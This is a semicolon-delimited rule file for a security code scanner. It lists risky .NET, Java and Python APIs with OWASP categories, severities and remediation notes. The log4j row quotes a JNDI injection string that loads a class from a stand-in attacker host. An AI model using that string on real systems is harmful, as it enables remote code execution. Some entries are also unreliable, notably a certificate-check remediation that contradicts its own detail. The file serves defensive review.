CategoryNo;CategoryName;CategoryType;Pattern;PatternName;Status;OutputFileName;IncludeComment;NotInternetFacing;IncludeIfSingleThread;Internal;Apply_BRs;Purpose;SearchOnlyFor;Classification;OWASP;Severity;Details;Remediation;Ref_1;Ref_2
20;Language;NET;_unloaddll;_unloaddll;Insecure;Language_NET_Insecure__unloaddll;False;;True;False;True;;;Versioning;A6-Vulnerable and Outdated Components;Medium;deprecated;;https://msdn.microsoft.com/en-us/library/mt620088.aspx;
20;Language;NET;_getdllprocaddr;_getdllprocaddr;Insecure;Language_NET_Insecure__getdllprocaddr;False;;True;False;True;;;Versioning;A6-Vulnerable and Outdated Components;Medium;deprecated;;https://msdn.microsoft.com/en-us/library/mt620088.aspx;
20;Language;NET;_seterrormode;_seterrormode;Insecure;Language_NET_Insecure__seterrormode;False;;True;False;True;;;Versioning;A6-Vulnerable and Outdated Components;Medium;deprecated;;https://msdn.microsoft.com/en-us/library/mt620088.aspx;
20;Language;NET;_beep;_beep;Insecure;Language_NET_Insecure__beep;False;;False;False;True;;;Versioning;A6-Vulnerable and Outdated Components;Medium;deprecated;;https://msdn.microsoft.com/en-us/library/mt620088.aspx;
20;Language;NET;_sleep;_sleep;Insecure;Language_NET_Insecure__sleep;False;;False;False;True;;;Versioning;A6-Vulnerable and Outdated Components;Medium;deprecated;;https://msdn.microsoft.com/en-us/library/mt620088.aspx;
20;Language;NET;_getsystime;_getsystime;Insecure;Language_NET_Insecure__getsystime;False;;False;False;True;;;Versioning;A6-Vulnerable and Outdated Components;Medium;deprecated;;https://msdn.microsoft.com/en-us/library/mt620088.aspx;
20;Language;NET;_setsystime;_setsystime;Insecure;Language_NET_Insecure__setsystime;False;;False;False;True;;;Versioning;A6-Vulnerable and Outdated Components;Medium;deprecated;;https://msdn.microsoft.com/en-us/library/mt620088.aspx;
20;Language;NET;AAEAAAD/////;serializable_vartype_1;Investigate;Language_NET_Investigate_serializable_vartype_1;False;;True;False;True;;;Remote code execution;A8-Software and Data Integrity Failures ;High;Deserialization vulnerability;Whitelist types allowed to be deserialized.;https://www.owasp.org/index.php/Deserialization_Cheat_Sheet;
20;Language;NET;TypeObject;typeobject;Investigate;Language_NET_Investigate_typeobject;False;;True;False;True;;;Remote code execution;A8-Software and Data Integrity Failures ;High;Deserialization vulnerability;Whitelist types allowed to be deserialized.;https://www.owasp.org/index.php/Deserialization_Cheat_Sheet;
20;Language;NET;$type;$type;Investigate;Language_NET_Investigate_$type;False;;True;False;True;;;Remote code execution;A8-Software and Data Integrity Failures ;High;Deserialization vulnerability;Whitelist types allowed to be deserialized.;https://www.owasp.org/index.php/Deserialization_Cheat_Sheet;
20;Language;NET;JavaScriptTypeResolver;javascripttyperesolver;Insecure;Language_NET_Insecure_javascripttyperesolver;False;;True;False;True;;;Remote code execution;A8-Software and Data Integrity Failures ;High;Deserialization vulnerability, eg. Change file properties (to readonly causing DoS);Whitelist types allowed to be deserialized.;https://www.owasp.org/index.php/Deserialization_Cheat_Sheet;
30;Language;Java;RequestDispatcher.forward(;request_dispatcher_forward;Investigate;Language_Java_Investigate_request_dispatcher_forward;False;;True;False;True;;;;A1-Broken Access Control;Low;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;SpelExpressionParser;spel_expression_parser;Investigate;Language_Java_Investigate_spel_expression_parser;False;;True;False;True;;;;A1-Broken Access Control;Low;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;pageContext.forward(;page_context_forward;Investigate;Language_Java_Investigate_page_context_forward;False;;True;False;True;;;;A1-Broken Access Control;Low;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;".delete();";delete;Investigate;Language_Java_Investigate_delete;False;;True;False;True;;;;A1-Broken Access Control;Low;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;java.lang.Class.getDeclaredMethod;getdeclaredmethod;Investigate;Language_Java_Investigate_getdeclaredmethod;False;;True;False;True;;;Direct object access;A1-Broken Access Control;Low;Reflection - accessing even private fields or methods;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;java.lang.Class.getDeclaredField;getdeclaredfield;Investigate;Language_Java_Investigate_getdeclaredfield;False;;True;False;True;;;Direct object access;A1-Broken Access Control;Low;Reflection - accessing even private fields or methods;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;java.lang.reflection.Method.invoke;method_invoke;Investigate;Language_Java_Investigate_method_invoke;False;;True;False;True;;;Direct object access;A1-Broken Access Control;Low;Reflection - accessing even private fields or methods;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;java.lang.reflection.Field.set;field_set;Investigate;Language_Java_Investigate_field_set;False;;True;False;True;;;Direct object access;A1-Broken Access Control;Low;Reflection - accessing even private fields or methods;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;java.lang.reflection.Field.get;field_get;Investigate;Language_Java_Investigate_field_get;False;;True;False;True;;;Direct object access;A1-Broken Access Control;Low;Reflection - accessing even private fields or methods;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;ServletRequest.isUserInRole(;servlet_request_isuserinrole;Investigate;Language_Java_Investigate_servlet_request_isuserinrole;False;;True;False;True;Locate;;Authorization;A1-Broken Access Control;Medium;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;checkCallingOrSelf;checkCallingOrSelf;Investigate;Language_Java_Investigate_checkCallingOrSelf;False;;True;False;True;;;Authorization;A1-Broken Access Control;Medium;CWE284. If checkCallingOrSelf(Uri)Permission() methods are used in Inter-Process Communication (IPC), this can be exploited by malicious software to elevate privelige.;Use checkCalling(Uri)Permission instead.;;
30;Language;Java;Intent;Intent;Investigate;Language_Java_Investigate_Intent;False;;True;False;True;Locate;;Authorization (mobile only);A1-Broken Access Control;Medium;CWE925. Look for improper validation of intent by the broadcast receiver.;Verify that the Intent came from an authorized source, e.g. by checking the action string.;;
30;Language;Java;javax.crypto;javax_crypto;Investigate;Language_Java_Investigate_javax_crypto;False;;True;False;True;Locate;;Cryptography;A2-Cryptographic Failures;High;;;;
30;Language;Java;Math.Random;math_random;Investigate;Language_Java_Investigate_math_random;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;Only in security context;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;setSSLOnConnect(;set_ssl_onconnect;Investigate;Language_Java_Investigate_set_ssl_onconnect;False;;True;False;True;Locate;;Transport security;A2-Cryptographic Failures;Medium;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;jdk.tls.disabledAlgorithms;jdk_tls_disabledalgorithms;Investigate;Language_Java_Investigate_jdk_tls_disabledalgorithms;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;Medium;"MD5, SHA1, DSA, RSA keySize < 2048. ""From Java 7 onwards cipher suites can be excluded from use via a security policy file called java.security that is located under Java Runtime Environment in the /lib/security directory.""";;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;setDisableCNCheck;setDisableCNCheck;Investigate;Language_Java_Investigate_setDisableCNCheck;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;High;"Set whether or not JSEE should omit checking if the host name specified in the URL matches that of the Common Name (CN) on the server's certificate. Default is false; this attribute should not be set to true during production use.";Set to true in prd environment.;https://cxf.apache.org/javadoc/latest/org/apache/cxf/configuration/jsse/TLSClientParameters.html;
30;Language;Java;setMaxAge(;set_max_age;Investigate;Language_Java_Investigate_set_max_age;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;Medium;Session cookie.;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;Session.invalidate(;session_invalidate;Investigate;Language_Java_Investigate_session_invalidate;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;Medium;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;unsecure;unsecure;Investigate;Language_Java_Investigate_unsecure;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;Medium;"Look for unsecure=""disabled""";;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;ServletResponse.addCookie(;servlet_response_addcookie;Investigate;Language_Java_Investigate_servlet_response_addcookie;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;Low;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;ServletRequest.isSecure(;servlet_request_issecure;Investigate;Language_Java_Investigate_servlet_request_issecure;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;Low;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;ClassLoader;ClassLoader;Investigate;Language_Java_Investigate_ClassLoader;False;;True;False;True;;;Remote code execution;A3-Injection;High;"Arbitrary code execution; java.lang.ClassLoader.defineClass, java.net.URLClassLoader ";;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;DataBinder;DataBinder;Investigate;Language_Java_Investigate_DataBinder;False;;True;False;True;;;Remote code execution;A3-Injection;High;"Spring4Shell. Arbitrary code execution; java.lang.ClassLoader.defineClass, java.net.URLClassLoader ";"JDK > 9, blacklist querystring patterns containing ""class""";https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/#exploit-scenario-overview;https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/validation/
30;Language;Java;chmod(;chmod;Investigate;Language_Java_Investigate_chmod;False;;True;False;True;;;Remote code execution;A3-Injection;High;File access;;;
30;Language;Java;log4j;log4j;Investigate;Language_Java_Investigate_log4j;False;;True;False;True;Locate;;Remote code execution;A3-Injection;High;"If user input is logged, remote code execution may be possible on the log server with the rights of the app. An attacker may inject ""jndi:ldap://www.attacker.com/malicious_java_class"". This lands within ${..} and the log4j lookup feature will execute the java class on the remote attacker site.";Strict user input validatiob/sanitizing.;https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/#root-cause-analysis;https://www.ncsc.nl/actueel/advisory?id=NCSC-2021-1052
30;Language;Java;java.io.File.delete;file_delete;Investigate;Language_Java_Investigate_file_delete;False;;True;False;True;Locate;;SQL Injection;A3-Injection;High;;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;java.io.File.renameTo;file_renameto;Investigate;Language_Java_Investigate_file_renameto;False;;True;False;True;Locate;;SQL Injection;A3-Injection;High;;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;java.io.FileInputStream;fileinputstream;Investigate;Language_Java_Investigate_fileinputstream;False;;True;False;False;Locate;;SQL Injection;A3-Injection;High;;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;java.io.FileOutputStream;fileoutputstream;Investigate;Language_Java_Investigate_fileoutputstream;False;;True;False;False;Locate;;SQL Injection;A3-Injection;High;;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;java.io.FileWriter;filewriter;Investigate;Language_Java_Investigate_filewriter;False;;True;False;False;Locate;;SQL Injection;A3-Injection;High;;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;java.io.RandomAccessFile;randomaccessfile;Investigate;Language_Java_Investigate_randomaccessfile;False;;True;False;False;Locate;;SQL Injection;A3-Injection;High;;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;java.sql.Statement;sql_statement;Investigate;Language_Java_Investigate_sql_statement;False;;True;False;True;Locate;;SQL injection;A3-Injection;High;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;persistence;persistence;Investigate;Language_Java_Investigate_persistence;False;;True;False;True;Locate;;SQL Injection;A3-Injection;High;Java Persistence API (JPA)  injection;Use parameterized queries;https://software-security.sans.org/developer-how-to/fix-sql-injection-in-java-persistence-api-jpa;https://tomee.apache.org/injection-of-entitymanager-example.html
30;Language;Java;BeanUtils.populate(;beanutils_populate;Investigate;Language_Java_Investigate_beanutils_populate;False;;True;False;True;;;;A3-Injection;Medium;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;@requestparam;request_param;Investigate;Language_Java_Investigate_request_param;False;;True;False;True;Locate;;Input validation;A3-Injection;Medium;Spring framework;If whitelisting is not possible, validate on length (if possible < 15), format and/or allowed characters (e.g via regex).;https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html;
30;Language;Java;javax.script.ScriptEngine.eval;scriptengine_eval;Investigate;Language_Java_Investigate_scriptengine_eval;False;;True;False;True;;;XSS;A3-Injection;High;Arbitrary code execution;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;java.net.URLEncoder;java_net_urlencoder;Investigate;Language_Java_Investigate_java_net_urlencoder;False;;True;False;True;;;XSS;A3-Injection;Low;;;;
30;Language;Java;java.net.URLDecoder;java_net_urldecoder;Investigate;Language_Java_Investigate_java_net_urldecoder;False;;True;False;True;;;XSS;A3-Injection;Low;;;;
30;Language;Java;ServletResponse.encodeURL;servlet_response_encodeurl;Investigate;Language_Java_Investigate_servlet_response_encodeurl;False;;True;False;True;;;XSS;A3-Injection;Low;;;;
30;Language;Java;ServletResponse.setContentType(;servlet_response_setcontenttype;Investigate;Language_Java_Investigate_servlet_response_setcontenttype;False;;True;False;True;;;XSS;A3-Injection;Low;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;.parse(;parse;Investigate;Language_Java_Investigate_parse;False;;False;False;True;;;Sensitive data exposure;A6-Vulnerable and Outdated Components;Low;"Race condition format flaw; java.Text.Format and SimpleDateFormat method parse() are not thread-safe.";Use DateTimeFormatter (from Java 8) instead of SimpleDateFormat;https://vulncat.fortify.com/en/detail?id=desc.structural.java.race_condition_format_flaw;https://www.baeldung.com/migrating-to-java-8-date-time-api
30;Language;Java;java.beans.Instrospector.getBeanInfo;introspector;Investigate;Language_Java_Investigate_introspector;False;;True;False;True;;;Remote code execution;A5-Security Misconfiguration;Medium;Untrusted user input, e.g. via parameters.;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;xmldecoder;xmldecoder;Investigate;Language_Java_Investigate_xmldecoder;False;;True;False;True;Locate;;Remote code execution;A5-Security Misconfiguration;Medium;Serialization vulnerability;Check external user defined parameters. Override ObjectInputStream#resolveClass()  to prevent deserializing arbitrary classes. Use e.g. SerialKiller library.;https://www.owasp.org/index.php/Deserialization_Cheat_Sheet;
30;Language;Java;fromxml;fromxml;Investigate;Language_Java_Investigate_fromxml;False;;True;False;True;;;Remote code execution;A5-Security Misconfiguration;Medium;Serialization vulnerability;override ObjectInputStream#resolveClass()  to prevent deserializing arbitrary classes. Use e.g. SerialKiller library.;https://www.owasp.org/index.php/Deserialization_Cheat_Sheet;
30;Language;Java;DocumentBuilderFactory;documentbuilderfactory;Investigate;Language_Java_Investigate_documentbuilderfactory;False;;True;False;True;Locate;;XXE;A5-Security Misconfiguration;Medium;;Generally, disable DTD (External Entities).;https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet;
30;Language;Java;javax.servlet.ServletInputStream.readLine;javax_servlet_readline;Investigate;Language_Java_Investigate_javax_servlet_readline;False;;True;False;True;;;;A5-Security Misconfiguration;Medium;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;java.security;java_security;Investigate;Language_Java_Investigate_java_security;False;;True;False;False;Locate;;;A5-Security Misconfiguration;Low;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;checkRevocation;checkRevocation;Investigate;Language_Java_Investigate_checkRevocation;False;;True;False;True;;;;A5-Security Misconfiguration;Low;"Should be ""true""";;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;Files.setPosixFilePermissions(;files_setposixfilepermissions;Investigate;Language_Java_Investigate_files_setposixfilepermissions;False;;True;False;True;;;;A5-Security Misconfiguration;Low;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;InitialDirContext(;initial_dir_context;Investigate;Language_Java_Investigate_initial_dir_context;False;;True;False;True;;;;A5-Security Misconfiguration;Low;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;Database.SHARED;database_shared;Investigate;Language_Java_Investigate_database_shared;False;;False;False;True;;;;A5-Security Misconfiguration;Low;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;non-Crap;nonCrap;Investigate;Language_Java_Investigate_nonCrap;False;;True;False;True;;;;A6-Vulnerable and Outdated Components;Informational;;;Fortify;
30;Language;Java;WCB_ID;WCB_ID;Investigate;Language_Java_Investigate_WCB_ID;False;;True;False;True;;;;A6-Vulnerable and Outdated Components;Informational;;;Fortify;
30;Language;Java;java.rmi.RMISecurityException;RMISecurityException;Insecure;Language_Java_Insecure_RMISecurityException;False;;True;False;False;;;;A6-Vulnerable and Outdated Components;Medium;deprecated;;;
30;Language;Java;Boolean.getBoolean(;boolean_getboolean;Investigate;Language_Java_Investigate_boolean_getboolean;False;;True;False;True;;;;A6-Vulnerable and Outdated Components;Informational;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;java.security.Identity;security_Identity;Insecure;Language_Java_Insecure_security_Identity;False;;True;False;True;;;Authentication;A6-Vulnerable and Outdated Components;Medium;deprecated;;;
30;Language;Java;java.security.IdentityScope;security_IdentityScope;Insecure;Language_Java_Insecure_security_IdentityScope;False;;True;False;True;;;Authentication;A6-Vulnerable and Outdated Components;Medium;deprecated;;;
30;Language;Java;java.security.Signer;security_Signer;Insecure;Language_Java_Insecure_security_Signer;False;;True;False;True;;;Authentication;A6-Vulnerable and Outdated Components;Medium;deprecated;;;
30;Language;Java;Session.getId(;session_get_id;Investigate;Language_Java_Investigate_session_get_id;False;;True;False;True;;;;A7-Identification and Authentication Failures;Informational;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;ServletRequest.getUserPrincipal(;servlet_request_getuserprincipal;Investigate;Language_Java_Investigate_servlet_request_getuserprincipal;False;;True;False;True;Locate;;Authentication;A7-Identification and Authentication Failures;Medium;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;readObject;readobject;Investigate;Language_Java_Investigate_readobject;False;;True;False;True;;;Remote code execution;A8-Software and Data Integrity Failures ;High;Serialization vulnerability;override ObjectInputStream#resolveClass()  to prevent deserializing arbitrary classes. Use e.g. SerialKiller library.;https://www.owasp.org/index.php/Deserialization_Cheat_Sheet;
30;Language;Java;readResolve;readresolve;Investigate;Language_Java_Investigate_readresolve;False;;True;False;True;;;Remote code execution;A8-Software and Data Integrity Failures ;High;Serialization vulnerability;override ObjectInputStream#resolveClass()  to prevent deserializing arbitrary classes. Use e.g. SerialKiller library.;https://www.owasp.org/index.php/Deserialization_Cheat_Sheet;
30;Language;Java;readExternal;readexternal;Investigate;Language_Java_Investigate_readexternal;False;;True;False;True;;;Remote code execution;A8-Software and Data Integrity Failures ;High;Serialization vulnerability;override ObjectInputStream#resolveClass()  to prevent deserializing arbitrary classes. Use e.g. SerialKiller library.;https://www.owasp.org/index.php/Deserialization_Cheat_Sheet;
30;Language;Java;serializable;serializable;Investigate;Language_Java_Investigate_serializable;False;;True;False;True;Locate;;Remote code execution;A8-Software and Data Integrity Failures ;High;Serialization vulnerability (only if ReadObject() is used).;Make readObject() final. Or override ObjectInputStream#resolveClass()  to prevent deserializing arbitrary classes. Use e.g. SerialKiller library.;https://www.owasp.org/index.php/Deserialization_Cheat_Sheet;
30;Language;Java;ObjectInputStream.readUnshared;objectinputstream_readunshared;Investigate;Language_Java_Investigate_objectinputstream_readunshared;False;;True;False;True;;;Remote code execution;A8-Software and Data Integrity Failures ;High;Serialization vulnerability;override ObjectInputStream#resolveClass()  to prevent deserializing arbitrary classes. Use e.g. SerialKiller library.;https://www.owasp.org/index.php/Deserialization_Cheat_Sheet;
30;Language;Java;.format(;format;Investigate;Language_Java_Investigate_format;False;;False;False;True;;;Sensitive data exposure;A6-Vulnerable and Outdated Components;Low;"Race condition format flow; *Format classes use .format() and are not thread-safe.";Use DateTimeFormatter (from Java 8) instead of SimpleDateFormat;https://vulncat.fortify.com/en/detail?id=desc.structural.java.race_condition_format_flaw;https://www.baeldung.com/migrating-to-java-8-date-time-api
30;Language;Java;ServletContext.log(;servlet_context_log;Investigate;Language_Java_Investigate_servlet_context_log;False;;True;False;True;;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Low;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;println(;println;Investigate;Language_Java_Investigate_println;False;;True;False;True;;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Low;;;;
30;Language;Java;Throwable.printStackTrace(;throwable_printstacktrace;Investigate;Language_Java_Investigate_throwable_printstacktrace;False;;True;False;True;;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Low;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;java.io.File.listFiles;file_listfiles;Investigate;Language_Java_Investigate_file_listfiles;False;;True;False;True;Locate;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Medium;;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;java.io.File.list;file_list;Investigate;Language_Java_Investigate_file_list;False;;True;False;True;Locate;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Medium;;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;java.io.FileReader;filereader;Investigate;Language_Java_Investigate_filereader;False;;True;False;False;Locate;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Medium;;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;android.text.editable;android_text_editable;Investigate;Language_Java_Investigate_android_text_editable;False;;True;False;True;Locate;;XSS;A3-Injection;High;In android, with getText() and setText() you can manipulate user input (Edittext) via an Editable.;;https://stackoverflow.com/questions/25323194/what-does-editable-mean;
40;Language;Python;permission_classes;permission_classes;Investigate;Language_Python_Investigate_permission_classes;False;;True;False;True;;;Authorization;A1-Broken Access Control;Medium;;;https://www.django-rest-framework.org/api-guide/permissions/;
40;Language;Python;required_scope;required_scope;Investigate;Language_Python_Investigate_required_scope;False;;True;False;True;;;Authorization;A1-Broken Access Control;Medium;"Swagger Scopes should be defined (except ""read-the-docs""). See settings.py.";;;
40;Language;Python;os.unlink(;os_unlink;Investigate;Language_Python_Investigate_os_unlink;False;;True;False;True;;;Authorization;A1-Broken Access Control;High;;Authorization: Make sure user is owner of file;https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html;
40;Language;Python;random.randint(;random_randint;Investigate;Language_Python_Investigate_random_randint;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;Only in security context;;;
40;Language;Python;random.random(;random_random;Investigate;Language_Python_Investigate_random_random;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;Only in security context;;;
40;Language;Python;import ssl ;import_ssl;Investigate;Language_Python_Investigate_import_ssl;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;Medium;Python modules SSL and pyOpenSSL do not validate server identity.;In the code, retrieve X509. The subject common name (CN), should be equal to the host name.;https://wiki.python.org/moin/SSL;
40;Language;Python;pickle;pickle;Investigate;Language_Python_Investigate_pickle;False;;True;False;False;;;Command  injection;A3-Injection;High;Can it contain untrusted user input.;Use JSON serialization or add a digital signature.;https://security.stackexchange.com/questions/183966/safely-load-a-pickle-file;https://intoli.com/blog/dangerous-pickles/
40;Language;Python;shelve;shelve;Investigate;Language_Python_Investigate_shelve;False;;True;False;True;;;Command  injection;A3-Injection;High;shelve.open() opens a shelf, which is ako dictionary (may be class, anything pickle can handle) . Uses pickle, see pickle.;;https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html;https://studentrobotics.org/docs/python/library/shelve.html
40;Language;Python;yaml.load(;yaml_load;Investigate;Language_Python_Investigate_yaml_load;False;;True;False;True;;;Command  injection;A3-Injection;High;Can it contain untrusted user input.;yaml.safe_load();https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html;
40;Language;Python;joblib.load(;joblib_load;Investigate;Language_Python_Investigate_joblib_load;False;;True;False;True;;;Command  injection;A3-Injection;High;Can it contain untrusted user input. Joblib uses pickle.;Whitelist expected possible commands. ;https://joblib.readthedocs.io/en/latest/generated/joblib.load.html;
40;Language;Python;subprocess;subprocess;Investigate;Language_Python_Investigate_subprocess;False;;True;False;True;;;Command  injection;A3-Injection;High;Can it contain untrusted user input.;;https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html;https://www.tripwire.com/state-of-security/off-topic/digging-for-security-bugs-in-python-code/
40;Language;Python;shell=True;shell_true;Investigate;Language_Python_Investigate_shell_true;False;;True;False;True;;;Command  injection;A3-Injection;High;Can it contain untrusted user input? In combination with subprocess.call(command, shell=True);Escape vairables with pipes.qoute() (2.x) or  shlex.quote() (>3.3);https://www.kevinlondon.com/2015/07/26/dangerous-python-functions.html;
40;Language;Python;exec(;exec;Investigate;Language_Python_Investigate_exec;False;;True;False;True;;;Command  injection;A3-Injection;High;;Use version > v1.46;https://www.kevinlondon.com/2015/07/26/dangerous-python-functions.html;
40;Language;Python; extra(;extra;Investigate;Language_Python_Investigate_extra;False;;True;False;True;;;SQL Injection;A3-Injection;High;Django related. Circumvents Django protection;Escape querystring parameters and do not quote placeholders.;https://docs.djangoproject.com/en/4.1/topics/security;
40;Language;Python;query.filter;query_filter;Investigate;Language_Python_Investigate_query_filter;False;;True;False;True;;;SQL Injection;A3-Injection;High;Only non-parameterized;;;
40;Language;Python;django.utils.safestring;safestring;Investigate;Language_Python_Investigate_safestring;False;;True;False;True;;;XSS;A3-Injection;Medium;Are strings marked as safe that can be user-influenced?;;https://docs.djangoproject.com/en/2.1/topics/security;
40;Language;Python;render_to_string;render_to_string;Investigate;Language_Python_Investigate_render_to_string;False;Exclude;True;False;True;;;XSS;A3-Injection;Medium;Django xxs solution;;;
40;Language;Python; render(;render;Investigate;Language_Python_Investigate_render;False;;True;False;True;Locate;;Output encoding;A3-Injection;Medium;Shortcut for HttpResponse;Output sanitizing;;
40;Language;Python;reqparse.;reqparse;Investigate;Language_Python_Investigate_reqparse;False;;True;False;True;Locate;;Input validation;A3-Injection;Medium;deprecated;Input validation;https://flask-restful.readthedocs.io/en/0.3.6/reqparse.html;
40;Language;Python;allowed_host;allowed_host;Investigate;Language_Python_Investigate_allowed_host;False;Exclude;True;False;True;;;CORS;A5-Security Misconfiguration;Medium;[*] is over-permissive. Vulnerable when get_host() is used. Security is bypassed when request.META is used. ;;;
40;Language;Python;request.meta;request_meta;Investigate;Language_Python_Investigate_request_meta;False;;True;False;True;;;CORS;A5-Security Misconfiguration;Medium;Disables Django ALLOWED_HOST security if HOST is retrieved from META instead of get_host();;https://docs.djangoproject.com/en/2.2/ref/settings/;
40;Language;Python;*CF_VERIFY(contains, or, false, none);verify_false;Investigate;Language_Python_Investigate_verify_false;False;;True;False;True;;;Security misconfiguration;A5-Security Misconfiguration;Medium;Turnes off request cert checking.;Use the default Verify=True or pass certificate path.;https://docs.python-requests.org/en/master/user/advanced/;
40;Language;Python;os.popen*(;os_popen;Insecure;Language_Python_Insecure_os_popen;False;;True;False;True;;;Versioning;A6-Vulnerable and Outdated Components;Medium;deprecated;;https://www.kevinlondon.com/2015/07/26/dangerous-python-functions.html;
40;Language;Python;*CF_PARM_CHECK(getattr);getattr;Insecure;Language_Python_Insecure_getattr;False;;True;False;True;;;Sensitive data exposure;A4-Insecure Design;High;Default must be present to avoid crash. Only a risk if attribute name is user-influenced.;Add default parameter;;
